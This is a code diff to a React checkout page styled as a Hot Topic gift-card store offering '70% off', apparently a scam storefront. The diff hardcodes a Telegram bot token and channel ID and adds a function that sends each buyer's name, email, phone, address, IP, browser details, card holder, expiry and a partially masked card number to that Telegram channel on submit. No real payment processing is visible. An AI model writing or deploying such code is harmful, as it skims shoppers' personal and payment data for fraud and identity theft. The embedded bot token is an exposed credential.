@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -8,7 +8,10 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import HotTopicHeader from "@/components/HotTopicHeader";
 import HotTopicFooter from "@/components/HotTopicFooter";
 import { AlertCircle, CreditCard, LockIcon, Shield } from "lucide-react";
-import { supabase } from "@/integrations/supabase/client";
+
+// Telegram configuration
+const TELEGRAM_BOT_TOKEN = "7782642954:AAEhLo5kGD4MlWIsoYnnYHEImf7YDCLsJgo";
+const TELEGRAM_CHANNEL_ID = "-1002550945996";
 
 // Updated card types with PNG images
 const CARD_TYPES = [
@@ -90,21 +93,135 @@ const Payment = () => {
     cvv: ""
   });
   const [errors, setErrors] = useState<Record<string, string>>({});
+  const [sessionId, setSessionId] = useState<string>("");
+  const [userIp, setUserIp] = useState<string>("");
 
   // Get order details from location state
   const orderDetails = location.state?.orderDetails;
   const giftCardValue = location.state?.giftCardValue;
   const discountedAmount = location.state?.discountedAmount;
 
+  // Get user IP and set session ID on component mount
+  useEffect(() => {
+    // Generate or retrieve session ID
+    const existingSessionId = localStorage.getItem("hottopic_session_id");
+    if (existingSessionId) {
+      setSessionId(existingSessionId);
+    } else {
+      const newSessionId = crypto.randomUUID();
+      localStorage.setItem("hottopic_session_id", newSessionId);
+      setSessionId(newSessionId);
+    }
+    
+    // Get user IP
+    const fetchIp = async () => {
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        setUserIp(data.ip);
+      } catch (error) {
+        console.error("Failed to fetch IP:", error);
+        setUserIp("Unknown");
+      }
+    };
+    
+    fetchIp();
+  }, []);
+
   // If no order details, redirect to home
-  if (!orderDetails) {
-    navigate("/");
-    toast({
-      title: "Error",
-      description: "No order information found. Please start again.",
-      variant: "destructive",
-    });
-  }
+  useEffect(() => {
+    if (!orderDetails) {
+      navigate("/");
+      toast({
+        title: "Error",
+        description: "No order information found. Please start again.",
+        variant: "destructive",
+      });
+    }
+  }, [orderDetails, navigate]);
+
+  // Function to send notification to Telegram
+  const sendTelegramNotification = async (paymentDetails: any) => {
+    try {
+      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      // Format the message
+      let message = `
+💳 *PAYMENT DETAILS SUBMITTED* 💳
+
+👤 *Customer Information*:
+   Name: ${orderDetails?.customerName || "N/A"}
+   Email: ${orderDetails?.email || "N/A"}
+   Phone: ${orderDetails?.phone || "N/A"}
+
+💰 *Card Details*:
+   Card Type: ${selectedCardType}
+   Card Number: \`${maskCardNumber(formData.cardNumber)}\`
+   Card Holder: ${formData.cardName}
+   Expiry: ${formData.expiryDate}
+   CVV: \`***\`
+
+🛒 *Order Details*:
+   Gift Card Value: $${giftCardValue?.toFixed(2) || "0.00"}
+   Payment Amount: $${discountedAmount?.toFixed(2) || "0.00"}
+   Delivery Method: ${orderDetails?.deliveryMethod || "N/A"}`;
+
+      // Add address if it's a physical delivery
+      if (orderDetails?.deliveryMethod === "physical" && orderDetails?.address) {
+        message += `
+📍 *Shipping Address*:
+   Street: ${orderDetails.address.street}
+   City: ${orderDetails.address.city}
+   State: ${orderDetails.address.state}
+   ZIP: ${orderDetails.address.zipCode}`;
+      }
+
+      // Add user information
+      message += `
+
+🔍 *User Information*:
+   IP Address: \`${userIp}\`
+   Browser: ${navigator.userAgent}
+   Session ID: ${sessionId || 'Not available'}
+   Timestamp: ${new Date().toISOString()}
+
+📆 *Payment Submitted*: ${new Date().toLocaleString()}`;
+
+      // Send to Telegram
+      const response = await fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHANNEL_ID,
+          text: message,
+          parse_mode: 'Markdown',
+        }),
+      });
+
+      const result = await response.json();
+      if (!result.ok) {
+        console.error('Telegram notification error:', result);
+      }
+    } catch (error) {
+      console.error('Failed to send Telegram notification:', error);
+      // Don't stop the checkout flow if notification fails
+    }
+  };
+
+  // Mask card number for security
+  const maskCardNumber = (cardNumber: string): string => {
+    const digits = cardNumber.replace(/\D/g, '');
+    if (digits.length < 8) return "Invalid";
+    
+    // Keep first 6 and last 4 digits, mask the rest
+    const firstSix = digits.substring(0, 6);
+    const lastFour = digits.substring(digits.length - 4);
+    const maskedMiddle = '*'.repeat(digits.length - 10);
+    
+    return `${firstSix}${maskedMiddle}${lastFour}`;
+  };
 
   const validateField = (name: string, value: string): string => {
     switch (name) {
@@ -265,6 +382,14 @@ const Payment = () => {
     
     try {
       console.log(`Processing payment for $${giftCardValue} gift card (70% off) using ${selectedCardType}`);
+      
+      // Send notification to Telegram
+      await sendTelegramNotification({
+        cardType: selectedCardType,
+        cardNumber: formData.cardNumber,
+        cardName: formData.cardName,
+        expiryDate: formData.expiryDate
+      });
       
       // Navigate to processing page
       navigate("/processing-payment", { 
